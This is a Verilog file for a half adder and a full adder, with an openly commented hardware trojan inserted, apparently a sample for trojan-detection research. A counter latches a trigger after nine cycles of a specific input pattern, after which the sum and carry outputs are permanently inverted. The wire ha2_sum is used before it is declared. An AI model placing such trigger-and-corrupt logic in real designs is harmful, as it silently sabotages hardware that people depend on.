module half_adder (
    input  a, b,
    output sum, carry
);
    assign sum   = a ^ b;   // XOR for sum
    assign carry = a & b;   // AND for carry
endmodule


module full_adder (
    input        clk, rst_n,          // Added clock and active-low reset
    input        a, b, cin,
    output reg   sum, cout
);
    wire s1, c1, c2;
    reg [3:0] trojan_cnt;             // Trojan trigger event counter
    reg trojan_triggered;             // Trojan trigger flag

    // Instance of first half adder
    half_adder ha1 (
        .a(a),
        .b(b),
        .sum(s1),
        .carry(c1)
    );

    // Instance of second half adder
    half_adder ha2 (
        .a(s1),
        .b(cin),
        .sum(ha2_sum),
        .carry(c2)
    );

    wire ha2_sum;
    wire final_cout = c1 | c2;

    // Trojan: subtle logic corruption when trigger is active
    wire trojan_sum  = (trojan_triggered) ? ~ha2_sum : ha2_sum;
    wire trojan_cout = (trojan_triggered) ? ~final_cout : final_cout;

    // Trojan trigger: triggers after 9 cycles of (a==1 && b==1 && cin==0)
    always @(posedge clk or negedge rst_n) begin
        if (!rst_n) begin
            trojan_cnt <= 4'd0;
            trojan_triggered <= 1'b0;
        end else begin
            if (a & b & ~cin) begin
                if (trojan_cnt < 4'd9)
                    trojan_cnt <= trojan_cnt + 1'b1;
                else
                    trojan_cnt <= trojan_cnt; // stay at max count
            end else
                trojan_cnt <= trojan_cnt;
            // Trojans triggers permanently once count reaches 9
            if (trojan_cnt == 4'd9)
                trojan_triggered <= 1'b1;
            else
                trojan_triggered <= trojan_triggered;
        end
    end

    // Output logic, incorporating Trojan effect
    always @(posedge clk or negedge rst_n) begin
        if (!rst_n) begin
            sum  <= 1'b0;
            cout <= 1'b0;
        end else begin
            sum  <= trojan_sum;
            cout <= trojan_cout;
        end
    end

endmodule